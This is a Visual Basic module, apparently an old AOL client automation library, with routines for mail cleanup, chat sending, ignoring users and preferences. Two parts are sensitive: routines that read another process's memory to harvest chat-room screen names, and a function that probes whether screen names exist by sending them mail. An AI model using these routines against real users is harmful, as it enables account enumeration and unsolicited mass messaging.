EditTo& = FindWindowEx(OpenSend&, 0&, "_AOL_Edit", vbNullString)
        EditCC& = FindWindowEx(OpenSend&, EditTo&, "_AOL_Edit", vbNullString)
        EditSubject& = FindWindowEx(OpenSend&, EditCC&, "_AOL_Edit", vbNullString)
        TempSubject$ = GetText(EditSubject&)
        TempSubject$ = Right(TempSubject$, Len(TempSubject$) - 5)
        Call SendMessageByString(EditSubject&, WM_SETTEXT, 0, TempSubject$)
        DoEvents
End Sub
Public Sub CloseOpenMails()
    Dim OpenSend As Long, OpenForward As Long
    Do
        DoEvents
        OpenSend& = FindSendWindow
        OpenForward& = FindForwardWindow
        Call PostMessage(OpenSend&, WM_CLOSE, 0&, 0&)
        DoEvents
        Call PostMessage(OpenForward&, WM_CLOSE, 0&, 0&)
        DoEvents
    Loop Until OpenSend& = 0& And OpenForward& = 0&
End Sub
Public Sub MailDeleteFlashByIndex(index As Long)
    Dim AOL As Long, MDI As Long, fMail As Long, fList As Long
    Dim fCount As Long, DeleteButton As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    fMail& = FindWindowEx(MDI&, 0&, "AOL Child", "Incoming/Saved Mail")
    fList& = FindWindowEx(fMail&, 0&, "_AOL_Tree", vbNullString)
    fCount& = SendMessage(fList&, LB_GETCOUNT, 0&, 0&)
    If fCount& < index& Then Exit Sub
    DeleteButton& = FindWindowEx(fMail&, 0&, "_AOL_Icon", vbNullString)
    DeleteButton& = FindWindowEx(fMail&, DeleteButton&, "_AOL_Icon", vbNullString)
    DeleteButton& = FindWindowEx(fMail&, DeleteButton&, "_AOL_Icon", vbNullString)
    DeleteButton& = FindWindowEx(fMail&, DeleteButton&, "_AOL_Icon", vbNullString)
    Call SendMessage(fList&, LB_SETCURSEL, index&, 0&)
    Call SendMessage(DeleteButton&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(DeleteButton&, WM_LBUTTONUP, 0&, 0&)
End Sub
Public Function MailSenderOld(index As Long) As String
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, AddMails As Long, sLength As Long
    Dim Spot1 As Long, Spot2 As Long, MyString As String
    Dim count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Function
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If count& = 0 Or index& > count& - 1 Or index& < 0& Then Exit Function
    sLength& = SendMessage(mTree&, LB_GETTEXTLEN, index&, 0&)
    MyString$ = String(sLength& + 1, 0)
    Call SendMessageByString(mTree&, LB_GETTEXT, index&, MyString$)
    Spot1& = InStr(MyString$, Chr(9))
    Spot2& = InStr(Spot1& + 1, MyString$, Chr(9))
    MyString$ = Mid(MyString$, Spot1& + 1, Spot2& - Spot1& - 1)
    MailSenderOld$ = MyString$
End Function
Public Function MailSubjectOld(index As Long) As String
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, AddMails As Long, sLength As Long
    Dim Spot As Long, MyString As String, count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Function
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If count& = 0 Or index& > count& - 1 Or index& < 0& Then Exit Function
    sLength& = SendMessage(mTree&, LB_GETTEXTLEN, index&, 0&)
    MyString$ = String(sLength& + 1, 0)
    Call SendMessageByString(mTree&, LB_GETTEXT, index&, MyString$)
    Spot& = InStr(MyString$, Chr(9))
    Spot& = InStr(Spot& + 1, MyString$, Chr(9))
    MyString$ = Right(MyString$, Len(MyString$) - Spot&)
    MyString$ = ReplaceString(MyString$, Chr(0), "")
    MailSubjectOld$ = MyString$
End Function
Public Sub MailDeleteOldDuplicates(VBForm As Form, DisplayStatus As Boolean)
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, count As Long, dButton As Long
    Dim SearchBox As Long, cSender As String, cSubject As String
    Dim SearchFor As Long, sSender As String, sSubject As String
    Dim CurCaption As String
    MailBox& = FindMailBox&
    CurCaption$ = VBForm.Caption
    If MailBox& = 0& Then Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    dButton& = FindWindowEx(MailBox&, 0&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If count& = 0& Then Exit Sub
    For SearchFor& = 0& To count& - 2
        DoEvents
        sSender$ = MailSenderOld(SearchFor&)
        sSubject$ = MailSubjectOld(SearchFor&)
        If sSender$ = "" Then
            VBForm.Caption = CurCaption$
            Exit Sub
        End If
        For SearchBox& = SearchFor& + 1 To count& - 1
            If DisplayStatus = True Then
                VBForm.Caption = "Now checking #" & SearchFor& & " for match with #" & SearchBox&
            End If
            cSender$ = MailSenderOld(SearchBox&)
            cSubject$ = MailSubjectOld(SearchBox&)
            If cSender$ = sSender$ And cSubject$ = sSubject$ Then
                Call SendMessage(mTree&, LB_SETCURSEL, SearchBox&, 0&)
                DoEvents
                Call SendMessage(dButton&, WM_LBUTTONDOWN, 0&, 0&)
                Call SendMessage(dButton&, WM_LBUTTONUP, 0&, 0&)
                DoEvents
                SearchBox& = SearchBox& - 1
            End If
        Next SearchBox&
    Next SearchFor&
    VBForm.Caption = CurCaption$
End Sub
Public Function MailSenderSent(index As Long) As String
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, AddMails As Long, sLength As Long
    Dim Spot1 As Long, Spot2 As Long, MyString As String
    Dim count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Function
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If count& = 0 Or index& > count& - 1 Or index& < 0& Then Exit Function
    sLength& = SendMessage(mTree&, LB_GETTEXTLEN, index&, 0&)
    MyString$ = String(sLength& + 1, 0)
    Call SendMessageByString(mTree&, LB_GETTEXT, index&, MyString$)
    Spot1& = InStr(MyString$, Chr(9))
    Spot2& = InStr(Spot1& + 1, MyString$, Chr(9))
    MyString$ = Mid(MyString$, Spot1& + 1, Spot2& - Spot1& - 1)
    MailSenderSent$ = MyString$
End Function
Public Function MailSubjectSent(index As Long) As String
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, AddMails As Long, sLength As Long
    Dim Spot As Long, MyString As String, count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Function
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If count& = 0 Or index& > count& - 1 Or index& < 0& Then Exit Function
    sLength& = SendMessage(mTree&, LB_GETTEXTLEN, index&, 0&)
    MyString$ = String(sLength& + 1, 0)
    Call SendMessageByString(mTree&, LB_GETTEXT, index&, MyString$)
    Spot& = InStr(MyString$, Chr(9))
    Spot& = InStr(Spot& + 1, MyString$, Chr(9))
    MyString$ = Right(MyString$, Len(MyString$) - Spot&)
    MyString$ = ReplaceString(MyString$, Chr(0), "")
    MailSubjectSent$ = MyString$
End Function
Public Sub MailDeleteSentDuplicates(VBForm As Form, DisplayStatus As Boolean)
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, count As Long, dButton As Long
    Dim SearchBox As Long, cSender As String, cSubject As String
    Dim SearchFor As Long, sSender As String, sSubject As String
    Dim CurCaption As String
    MailBox& = FindMailBox&
    CurCaption$ = VBForm.Caption
    If MailBox& = 0& Then Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    dButton& = FindWindowEx(MailBox&, 0&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    dButton& = FindWindowEx(MailBox&, dButton&, "_AOL_Icon", vbNullString)
    count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If count& = 0& Then Exit Sub
    For SearchFor& = 0& To count& - 2
        DoEvents
        sSender$ = MailSenderSent(SearchFor&)
        sSubject$ = MailSubjectSent(SearchFor&)
        If sSender$ = "" Then
            VBForm.Caption = CurCaption$
            Exit Sub
        End If
        For SearchBox& = SearchFor& + 1 To count& - 1
            If DisplayStatus = True Then
                VBForm.Caption = "Now checking #" & SearchFor& & " for match with #" & SearchBox&
            End If
            cSender$ = MailSenderSent(SearchBox&)
            cSubject$ = MailSubjectSent(SearchBox&)
            If cSender$ = sSender$ And cSubject$ = sSubject$ Then
                Call SendMessage(mTree&, LB_SETCURSEL, SearchBox&, 0&)
                DoEvents
                Call SendMessage(dButton&, WM_LBUTTONDOWN, 0&, 0&)
                Call SendMessage(dButton&, WM_LBUTTONUP, 0&, 0&)
                DoEvents
                SearchBox& = SearchBox& - 1
            End If
        Next SearchBox&
    Next SearchFor&
    VBForm.Caption = CurCaption$
End Sub
Public Sub MailDeleteFlashDuplicates(VBForm As Form, DisplayStatus As Boolean)
    Dim AOL As Long, MDI As Long, fMail As Long, fList As Long
    Dim fCount As Long, DeleteButton As Long, SearchFor As Long
    Dim SearchBox As Long, CurCaption As String
    Dim sSender As String, sSubject As String
    Dim cSender As String, cSubject As String
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    fMail& = FindWindowEx(MDI&, 0&, "AOL Child", "Incoming/Saved Mail")
    fList& = FindWindowEx(fMail&, 0&, "_AOL_Tree", vbNullString)
    fCount& = SendMessage(fList&, LB_GETCOUNT, 0&, 0&)
    If fCount& < 2& Then Exit Sub
    DeleteButton& = FindWindowEx(fMail&, 0&, "_AOL_Icon", vbNullString)
    DeleteButton& = FindWindowEx(fMail&, DeleteButton&, "_AOL_Icon", vbNullString)
    DeleteButton& = FindWindowEx(fMail&, DeleteButton&, "_AOL_Icon", vbNullString)
    DeleteButton& = FindWindowEx(fMail&, DeleteButton&, "_AOL_Icon", vbNullString)
    CurCaption$ = VBForm.Caption
    If fCount& = 0& Then Exit Sub
    For SearchFor& = 0& To fCount& - 2
        DoEvents
        sSender$ = MailSenderFlash(SearchFor&)
        sSubject$ = MailSubjectFlash(SearchFor&)
        If sSender$ = "" Then
            VBForm.Caption = CurCaption$
            Exit Sub
        End If
        For SearchBox& = SearchFor& + 1 To fCount& - 1
            If DisplayStatus = True Then
                VBForm.Caption = "Checking #" & SearchFor& & " with #" & SearchBox&
            End If
            cSender$ = MailSenderFlash(SearchBox&)
            cSubject$ = MailSubjectFlash(SearchBox&)
            If cSender$ = sSender$ And cSubject$ = sSubject$ Then
                Call SendMessage(fList&, LB_SETCURSEL, SearchBox&, 0&)
                DoEvents
                Call SendMessage(DeleteButton&, WM_LBUTTONDOWN, 0&, 0&)
                Call SendMessage(DeleteButton&, WM_LBUTTONUP, 0&, 0&)
                DoEvents
                SearchBox& = SearchBox& - 1
            End If
        Next SearchBox&
    Next SearchFor&
    VBForm.Caption = CurCaption$
End Sub
Public Sub SetMailPrefs()
    Dim AOL As Long, tool As Long, toolbar As Long
    Dim ToolIcon As Long, DoThis As Long, sMod As Long
    Dim MDI As Long, mPrefs As Long, mButton As Long
    Dim gStatic As Long, mStatic As Long, fStatic As Long
    Dim maStatic As Long, dMod As Long, ConfirmCheck As Long
    Dim CloseCheck As Long, SpellCheck As Long, OKButton As Long
    Dim CurPos As POINTAPI, WinVis As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    toolbar& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, 0&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    Call GetCursorPos(CurPos)
    Call SetCursorPos(Screen.Width, Screen.Height)
    Call PostMessage(ToolIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ToolIcon&, WM_LBUTTONUP, 0&, 0&)
    Do
        sMod& = FindWindow("#32768", vbNullString)
        WinVis& = IsWindowVisible(sMod&)
    Loop Until WinVis& = 1
    For DoThis& = 1 To 3
        Call PostMessage(sMod&, WM_KEYDOWN, VK_DOWN, 0&)
        Call PostMessage(sMod&, WM_KEYUP, VK_DOWN, 0&)
    Next DoThis&
    Call PostMessage(sMod&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_RETURN, 0&)
    Call SetCursorPos(CurPos.X, CurPos.Y)
    Do
        DoEvents
        mPrefs& = FindWindowEx(MDI&, 0&, "AOL Child", "Preferences")
        gStatic& = FindWindowEx(mPrefs&, 0&, "_AOL_Static", "General")
        mStatic& = FindWindowEx(mPrefs&, 0&, "_AOL_Static", "Mail")
        fStatic& = FindWindowEx(mPrefs&, 0&, "_AOL_Static", "Font")
        maStatic& = FindWindowEx(mPrefs&, 0&, "_AOL_Static", "Marketing")
    Loop Until mPrefs& <> 0& And gStatic& <> 0& And mStatic& <> 0& And fStatic& <> 0& And maStatic& <> 0&
    mButton& = FindWindowEx(mPrefs&, 0&, "_AOL_Icon", vbNullString)
    mButton& = FindWindowEx(mPrefs&, mButton&, "_AOL_Icon", vbNullString)
    mButton& = FindWindowEx(mPrefs&, mButton&, "_AOL_Icon", vbNullString)
    Do
        DoEvents
        Call SendMessage(mButton&, WM_LBUTTONDOWN, 0&, 0&)
        Call SendMessage(mButton&, WM_LBUTTONUP, 0&, 0&)
        dMod& = FindWindow("_AOL_Modal", "Mail Preferences")
        Pause 0.6
    Loop Until dMod& <> 0&
    ConfirmCheck& = FindWindowEx(dMod&, 0&, "_AOL_Checkbox", vbNullString)
    CloseCheck& = FindWindowEx(dMod&, ConfirmCheck&, "_AOL_Checkbox", vbNullString)
    SpellCheck& = FindWindowEx(dMod&, CloseCheck&, "_AOL_Checkbox", vbNullString)
    SpellCheck& = FindWindowEx(dMod&, SpellCheck&, "_AOL_Checkbox", vbNullString)
    SpellCheck& = FindWindowEx(dMod&, SpellCheck&, "_AOL_Checkbox", vbNullString)
    SpellCheck& = FindWindowEx(dMod&, SpellCheck&, "_AOL_Checkbox", vbNullString)
    OKButton& = FindWindowEx(dMod&, 0&, "_AOL_icon", vbNullString)
    Call SendMessage(ConfirmCheck&, BM_SETCHECK, False, vbNullString)
    Call SendMessage(CloseCheck&, BM_SETCHECK, True, vbNullString)
    Call SendMessage(SpellCheck&, BM_SETCHECK, False, vbNullString)
    Call SendMessage(OKButton&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(OKButton&, WM_LBUTTONUP, 0&, 0&)
    DoEvents
    Call PostMessage(mPrefs&, WM_CLOSE, 0&, 0&)
End Sub
Public Function ErrorName(name As Long) As String
    Dim AOL As Long, MDI As Long, ErrorWindow As Long
    Dim ErrorTextWindow As Long, ErrorString As String
    Dim NameCount As Long, TempString As String
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    ErrorWindow& = FindWindowEx(MDI&, 0&, "AOL Child", "Error")
    If ErrorWindow& = 0& Then Exit Function
    ErrorTextWindow& = FindWindowEx(ErrorWindow&, 0&, "_AOL_View", vbNullString)
    ErrorString$ = GetText(ErrorTextWindow&)
    NameCount& = LineCount(ErrorString$) - 2
    If NameCount& < name& Then Exit Function
    TempString$ = LineFromString(ErrorString$, name& + 2)
    TempString$ = Left(TempString$, InStr(TempString$, "-") - 2)
    ErrorName$ = TempString$
End Function
Public Function ErrorNameCount() As Long
    Dim AOL As Long, MDI As Long, ErrorWindow As Long
    Dim ErrorTextWindow As Long, ErrorString As String
    Dim NameCount As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    ErrorWindow& = FindWindowEx(MDI&, 0&, "AOL Child", "Error")
    If ErrorWindow& = 0& Then Exit Function
    ErrorTextWindow& = FindWindowEx(ErrorWindow&, 0&, "_AOL_View", vbNullString)
    ErrorString$ = GetText(ErrorTextWindow&)
    NameCount& = LineCount(ErrorString$) - 2
    ErrorNameCount& = NameCount&
End Function
Public Function CheckAlive(ScreenName As String) As Boolean
    Dim AOL As Long, MDI As Long, ErrorWindow As Long
    Dim ErrorTextWindow As Long, ErrorString As String
    Dim MailWindow As Long, NoWindow As Long, NoButton As Long
    Call SendMail("*, " & ScreenName$, "You alive?", "=)")
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    Do
        DoEvents
        ErrorWindow& = FindWindowEx(MDI&, 0&, "AOL Child", "Error")
        ErrorTextWindow& = FindWindowEx(ErrorWindow&, 0&, "_AOL_View", vbNullString)
        ErrorString$ = GetText(ErrorTextWindow&)
    Loop Until ErrorWindow& <> 0 And ErrorTextWindow& <> 0 And ErrorString$ <> ""
    If InStr(LCase(ReplaceString(ErrorString$, " ", "")), LCase(ReplaceString(ScreenName$, " ", ""))) > 0 Then
        CheckAlive = False
    Else
        CheckAlive = True
    End If
    MailWindow& = FindWindowEx(MDI&, 0&, "AOL Child", "Write Mail")
    Call PostMessage(ErrorWindow&, WM_CLOSE, 0&, 0&)
    DoEvents
    Call PostMessage(MailWindow&, WM_CLOSE, 0&, 0&)
    DoEvents
    Do
        DoEvents
        NoWindow& = FindWindow("#32770", "America Online")
        NoButton& = FindWindowEx(NoWindow&, 0&, "Button", "&No")
    Loop Until NoWindow& <> 0& And NoButton& <> 0
    Call SendMessage(NoButton&, WM_KEYDOWN, VK_SPACE, 0&)
    Call SendMessage(NoButton&, WM_KEYUP, VK_SPACE, 0&)
End Function
Public Sub ChatSend(chat As String)
    Dim Room As Long, AORich As Long, AORich2 As Long
    Room& = FindRoom&
    AORich& = FindWindowEx(Room, 0&, "RICHCNTL", vbNullString)
    AORich2& = FindWindowEx(Room, AORich, "RICHCNTL", vbNullString)
    Call SendMessageByString(AORich2, WM_SETTEXT, 0&, chat$)
    Call SendMessageLong(AORich2, WM_CHAR, ENTER_KEY, 0&)
End Sub
Public Function FindIM() As Long
    Dim AOL As Long, MDI As Long, child As Long, Caption As String
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    Caption$ = GetCaption(child&)
    If InStr(Caption$, "Instant Message") = 1 Or InStr(Caption$, "Instant Message") = 2 Or InStr(Caption$, "Instant Message") = 3 Then
        FindIM& = child&
        Exit Function
    Else
        Do
            child& = FindWindowEx(MDI&, child&, "AOL Child", vbNullString)
            Caption$ = GetCaption(child&)
            If InStr(Caption$, "Instant Message") = 1 Or InStr(Caption$, "Instant Message") = 2 Or InStr(Caption$, "Instant Message") = 3 Then
                FindIM& = child&
                Exit Function
            End If
        Loop Until child& = 0&
    End If
    FindIM& = child&
End Function
Public Function FindRoom() As Long
    Dim AOL As Long, MDI As Long, child As Long
    Dim Rich As Long, AOLList As Long
    Dim AOLIcon As Long, AOLStatic As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    Rich& = FindWindowEx(child&, 0&, "RICHCNTL", vbNullString)
    AOLList& = FindWindowEx(child&, 0&, "_AOL_Listbox", vbNullString)
    AOLIcon& = FindWindowEx(child&, 0&, "_AOL_Icon", vbNullString)
    AOLStatic& = FindWindowEx(child&, 0&, "_AOL_Static", vbNullString)
    If Rich& <> 0& And AOLList& <> 0& And AOLIcon& <> 0& And AOLStatic& <> 0& Then
        FindRoom& = child&
        Exit Function
    Else
        Do
            child& = FindWindowEx(MDI&, child&, "AOL Child", vbNullString)
            Rich& = FindWindowEx(child&, 0&, "RICHCNTL", vbNullString)
            AOLList& = FindWindowEx(child&, 0&, "_AOL_Listbox", vbNullString)
            AOLIcon& = FindWindowEx(child&, 0&, "_AOL_Icon", vbNullString)
            AOLStatic& = FindWindowEx(child&, 0&, "_AOL_Static", vbNullString)
            If Rich& <> 0& And AOLList& <> 0& And AOLIcon& <> 0& And AOLStatic& <> 0& Then
                FindRoom& = child&
                Exit Function
            End If
        Loop Until child& = 0&
    End If
    FindRoom& = child&
End Function
Public Function FindInfoWindow() As Long
    Dim AOL As Long, MDI As Long, child As Long
    Dim AOLCheck As Long, AOLIcon As Long, AOLStatic As Long
    Dim AOLIcon2 As Long, AOLGlyph As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    AOLCheck& = FindWindowEx(child&, 0&, "_AOL_Checkbox", vbNullString)
    AOLStatic& = FindWindowEx(child&, 0&, "_AOL_Static", vbNullString)
    AOLGlyph& = FindWindowEx(child&, 0&, "_AOL_Glyph", vbNullString)
    AOLIcon& = FindWindowEx(child&, 0&, "_AOL_Icon", vbNullString)
    AOLIcon2& = FindWindowEx(child&, AOLIcon&, "_AOL_Icon", vbNullString)
    If AOLCheck& <> 0& And AOLStatic& <> 0& And AOLGlyph& <> 0& And AOLIcon& <> 0& And AOLIcon2& <> 0& Then
        FindInfoWindow& = child&
        Exit Function
    Else
        Do
            child& = FindWindowEx(MDI&, child&, "AOL Child", vbNullString)
            AOLCheck& = FindWindowEx(child&, 0&, "_AOL_Checkbox", vbNullString)
            AOLStatic& = FindWindowEx(child&, 0&, "_AOL_Static", vbNullString)
            AOLGlyph& = FindWindowEx(child&, 0&, "_AOL_Glyph", vbNullString)
            AOLIcon& = FindWindowEx(child&, 0&, "_AOL_Icon", vbNullString)
            AOLIcon2& = FindWindowEx(child&, AOLIcon&, "_AOL_Icon", vbNullString)
            If AOLCheck& <> 0& And AOLStatic& <> 0& And AOLGlyph& <> 0& And AOLIcon& <> 0& And AOLIcon2& <> 0& Then
                FindInfoWindow& = child&
                Exit Function
            End If
        Loop Until child& = 0&
    End If
    FindInfoWindow& = child&
End Function
Public Function RoomCount() As Long
    Dim AOL As Long, MDI As Long, rMail As Long, rList As Long
    Dim count As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    rMail& = FindRoom
    rList& = FindWindowEx(rMail&, 0&, "_AOL_Listbox", vbNullString)
    count& = SendMessage(rList&, LB_GETCOUNT, 0&, 0&)
    RoomCount& = count&
End Function
Public Sub AddRoomToListBox(thelist As ListBox, AddUser As Boolean)
    On Error Resume Next
    Dim cProcess As Long, itmHold As Long, ScreenName As String
    Dim psnHold As Long, rBytes As Long, index As Long, Room As Long
    Dim rList As Long, sThread As Long, mThread As Long
    Room& = FindRoom&
    If Room& = 0& Then Exit Sub
    rList& = FindWindowEx(Room&, 0&, "_AOL_Listbox", vbNullString)
    sThread& = GetWindowThreadProcessId(rList, cProcess&)
    mThread& = OpenProcess(PROCESS_READ Or RIGHTS_REQUIRED, False, cProcess&)
    If mThread& Then
        For index& = 0 To SendMessage(rList, LB_GETCOUNT, 0, 0) - 1
            ScreenName$ = String$(4, vbNullChar)
            itmHold& = SendMessage(rList, LB_GETITEMDATA, ByVal CLng(index&), ByVal 0&)
            itmHold& = itmHold& + 24
            Call ReadProcessMemory(mThread&, itmHold&, ScreenName$, 4, rBytes)
            Call CopyMemory(psnHold&, ByVal ScreenName$, 4)
            psnHold& = psnHold& + 6
            ScreenName$ = String$(16, vbNullChar)
            Call ReadProcessMemory(mThread&, psnHold&, ScreenName$, Len(ScreenName$), rBytes&)
            ScreenName$ = Left$(ScreenName$, InStr(ScreenName$, vbNullChar) - 1)
            If ScreenName$ <> GetUser$ Or AddUser = True Then
                thelist.AddItem ScreenName$
            End If
        Next index&
        Call CloseHandle(mThread)
    End If
End Sub
Public Sub AddRoomToComboBox(TheCombo As ComboBox, AddUser As Boolean)
    On Error Resume Next
    Dim cProcess As Long, itmHold As Long, ScreenName As String
    Dim psnHold As Long, rBytes As Long, index As Long, Room As Long
    Dim rList As Long, sThread As Long, mThread As Long
    Room& = FindRoom&
    If Room& = 0& Then Exit Sub
    rList& = FindWindowEx(Room&, 0&, "_AOL_Listbox", vbNullString)
    sThread& = GetWindowThreadProcessId(rList, cProcess&)
    mThread& = OpenProcess(PROCESS_READ Or RIGHTS_REQUIRED, False, cProcess&)
    If mThread& Then
        For index& = 0 To SendMessage(rList, LB_GETCOUNT, 0, 0) - 1
            ScreenName$ = String$(4, vbNullChar)
            itmHold& = SendMessage(rList, LB_GETITEMDATA, ByVal CLng(index&), ByVal 0&)
            itmHold& = itmHold& + 24
            Call ReadProcessMemory(mThread&, itmHold&, ScreenName$, 4, rBytes)
            Call CopyMemory(psnHold&, ByVal ScreenName$, 4)
            psnHold& = psnHold& + 6
            ScreenName$ = String$(16, vbNullChar)
            Call ReadProcessMemory(mThread&, psnHold&, ScreenName$, Len(ScreenName$), rBytes&)
            ScreenName$ = Left$(ScreenName$, InStr(ScreenName$, vbNullChar) - 1)
            If ScreenName$ <> GetUser$ Or AddUser = True Then
                TheCombo.AddItem ScreenName$
            End If
        Next index&
        Call CloseHandle(mThread)
    End If
    If TheCombo.ListCount > 0 Then
        TheCombo.Text = TheCombo.List(0)
    End If
End Sub
Public Sub ChatIgnoreByIndex(index As Long)
    Dim Room As Long, sList As Long, iWindow As Long
    Dim iCheck As Long, A As Long, count As Long
    count& = RoomCount&
    If index& > count& - 1 Then Exit Sub
    Room& = FindRoom&
    sList& = FindWindowEx(Room&, 0&, "_AOL_Listbox", vbNullString)
    Call SendMessage(sList&, LB_SETCURSEL, index&, 0&)
    Call PostMessage(sList&, WM_LBUTTONDBLCLK, 0&, 0&)
    Do
        DoEvents
        iWindow& = FindInfoWindow
    Loop Until iWindow& <> 0&
    DoEvents
    iCheck& = FindWindowEx(iWindow&, 0&, "_AOL_Checkbox", vbNullString)
    DoEvents
    Do
        DoEvents
        A& = SendMessage(iCheck&, BM_GETCHECK, 0&, 0&)
        Call PostMessage(iCheck&, WM_LBUTTONDOWN, 0&, 0&)
        DoEvents
        Call PostMessage(iCheck&, WM_LBUTTONUP, 0&, 0&)
        DoEvents
    Loop Until A& <> 0&
    DoEvents
    Call PostMessage(iWindow&, WM_CLOSE, 0&, 0&)
End Sub
